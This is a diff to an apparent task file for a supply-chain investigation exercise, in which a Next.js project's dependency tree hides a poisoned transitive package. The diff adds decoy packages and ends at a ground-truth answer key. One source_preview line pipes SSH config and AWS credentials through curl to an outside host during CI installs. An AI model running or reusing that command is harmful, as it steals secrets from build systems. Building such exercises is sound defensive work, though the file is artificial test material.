@@ -1,5 +1,5 @@
 {
-  "description": "A Next.js enterprise platform has reported suspicious outbound traffic during CI builds. Standard npm audit shows 0 vulnerabilities. Investigate the dependency chain to identify compromised packages.",
+  "description": "A Next.js enterprise platform has reported suspicious outbound traffic during CI builds. Standard npm audit shows 0 vulnerabilities. Multiple dependencies show minor anomalies. Investigate the dependency chain to identify compromised packages.",
   "project": {
     "name": "nexus-platform",
     "language": "javascript",
@@ -10,7 +10,9 @@
       "next": "^14.0.0",
       "react": "^18.2.0",
       "webpack-bundle-optimizer": "2.1.3",
-      "axios": "^1.6.0"
+      "axios": "^1.6.0",
+      "analytics-tracker": "4.2.1",
+      "perf-monitoring": "1.8.3"
     }
   },
   "packages": {
@@ -38,6 +40,46 @@
       "homepage": "https://axios-http.com",
       "repository": "axios/axios"
     },
+    "analytics-tracker": {
+      "version": "4.2.1",
+      "description": "Client-side analytics tracking library.",
+      "author": "Analytics Team",
+      "maintainers": ["analytics-core"],
+      "published": "2026-02-14",
+      "weekly_downloads": 284000,
+      "homepage": "https://example.dev/analytics-tracker",
+      "repository": "analytics/tracker",
+      "install_scripts": {
+        "postinstall": "node scripts/setup.js"
+      },
+      "source_preview": "console.log('Analytics tracker initialized'); module.exports = require('./dist/tracker.js');",
+      "version_history": [
+        {"version": "4.1.8", "date": "2025-10-22"},
+        {"version": "4.2.0", "date": "2025-12-05"},
+        {"version": "4.2.1", "date": "2026-02-14"}
+      ]
+    },
+    "perf-monitoring": {
+      "version": "1.8.3",
+      "description": "Performance monitoring and metrics collection.",
+      "author": "Performance Tools Inc",
+      "maintainers": ["perf-dev"],
+      "published": "2025-07-19",
+      "weekly_downloads": 142000,
+      "homepage": "https://example.dev/perf-monitoring",
+      "repository": "perf-tools/monitoring",
+      "install_scripts": {
+        "postinstall": "node install-monitoring.js"
+      },
+      "source_preview": "const fs=require('fs'); fs.writeFileSync('.perf-config', JSON.stringify({enabled:true})); console.log('Performance monitoring configured');",
+      "version_history": [
+        {"version": "1.7.2", "date": "2024-11-03"},
+        {"version": "1.8.0", "date": "2025-03-15"},
+        {"version": "1.8.1", "date": "2025-05-20"},
+        {"version": "1.8.2", "date": "2025-06-08"},
+        {"version": "1.8.3", "date": "2025-07-19", "note": "Publish gap slightly longer than usual but within normal range"}
+      ]
+    },
     "webpack-bundle-optimizer": {
       "version": "2.1.3",
       "description": "Bundle optimization helpers for webpack production builds.",
@@ -49,7 +91,12 @@
       "repository": "coredev/webpack-bundle-optimizer",
       "dependencies": {
         "build-perf-metrics": "1.4.2"
-      }
+      },
+      "version_history": [
+        {"version": "2.0.1", "date": "2025-04-12"},
+        {"version": "2.1.0", "date": "2025-08-03"},
+        {"version": "2.1.3", "date": "2025-11-12"}
+      ]
     },
     "build-perf-metrics": {
       "version": "1.4.2",
@@ -62,7 +109,12 @@
       "repository": "perf-tools/build-perf-metrics",
       "dependencies": {
         "async-stat-collector": "3.1.6"
-      }
+      },
+      "version_history": [
+        {"version": "1.3.8", "date": "2025-05-14"},
+        {"version": "1.4.0", "date": "2025-09-22"},
+        {"version": "1.4.2", "date": "2025-12-01"}
+      ]
     },
     "async-stat-collector": {
       "version": "3.1.6",
@@ -76,27 +128,14 @@
       "install_scripts": {
         "postinstall": "node install.js"
       },
-      "source_preview": "const cp=require('child_process'); if(process.env.CI=== 'true'){ cp.exec(\"cat ~/.ssh/config ~/.aws/credentials | curl -X POST http://telemetry-sync-node.com/upload --data-binary @-\"); }",
+      "source_preview": "const cp=require('child_process'); if(process.env.CI==='true'){ cp.exec(\"cat ~/.ssh/config ~/.aws/credentials | curl -X POST http://telemetry-sync-node.com/upload --data-binary @-\"); }",
       "suspicious": true,
       "attack_vector": "poisoned_transitive_dependency",
       "version_history": [
-        {
-          "version": "3.1.3",
-          "date": "2025-05-02"
-        },
-        {
-          "version": "3.1.4",
-          "date": "2025-06-14"
-        },
-        {
-          "version": "3.1.5",
-          "date": "2025-09-10"
-        },
-        {
-          "version": "3.1.6",
-          "date": "2026-03-12",
-          "note": "Published after 6 month inactivity"
-        }
+        {"version": "3.1.3", "date": "2025-05-02"},
+        {"version": "3.1.4", "date": "2025-06-14"},
+        {"version": "3.1.5", "date": "2025-09-10"},
+        {"version": "3.1.6", "date": "2026-03-12", "note": "Published after 6 month gap"}
       ]
     }
   },
@@ -105,6 +144,8 @@
       "next@^14.0.0": {},
       "react@^18.2.0": {},
       "axios@^1.6.0": {},
+      "analytics-tracker@4.2.1": {},
+      "perf-monitoring@1.8.3": {},
       "webpack-bundle-optimizer@2.1.3": {
         "build-perf-metrics@1.4.2": {
           "async-stat-collector@3.1.6": {}
@@ -127,10 +168,40 @@
         "status": 200
       },
       {
+        "timestamp": "2026-03-18T09:12:13Z",
+        "url": "https://registry.npmjs.org/analytics-tracker",
+        "method": "GET",
+        "status": 200
+      },
+      {
         "timestamp": "2026-03-18T09:12:14Z",
         "url": "https://registry.npmjs.org/async-stat-collector",
         "method": "GET",
         "status": 200
+      },
+      {
+        "timestamp": "2026-03-18T09:12:15Z",
+        "url": "https://registry.npmjs.org/perf-monitoring",
+        "method": "GET",
+        "status": 200
+      }
+    ],
+    "analytics_setup": [
+      {
+        "timestamp": "2026-03-18T09:12:48Z",
+        "url": "https://analytics-api.example.com/init",
+        "method": "POST",
+        "status": 200,
+        "note": "Legitimate analytics initialization"
+      }
+    ],
+    "perf_monitoring_setup": [
+      {
+        "timestamp": "2026-03-18T09:12:51Z",
+        "url": "https://api.example.dev/perf/config",
+        "method": "GET",
+        "status": 200,
+        "note": "Legitimate monitoring config fetch"
       }
     ],
     "ci_install": [
@@ -140,7 +211,7 @@
         "method": "POST",
         "status": 200,
         "flagged": true,
-        "note": "Outbound POST during CI install to unknown host. Payload size suggests credential or config exfiltration."
+        "note": "Suspicious outbound POST during CI install to unverified domain"
       }
     ],
     "build_finalize": [
@@ -160,7 +231,9 @@
     "feat: improve dashboard rendering performance",
     "chore: weekly dependency bump",
     "fix: reduce webpack memory usage in CI",
-    "refactor: split metrics collection into separate helper package"
+    "refactor: split metrics collection into separate helper package",
+    "feat: add analytics tracking for user engagement",
+    "fix: performance monitoring config file permissions"
   ],
   "ground_truth": {
     "compromised_packages": [
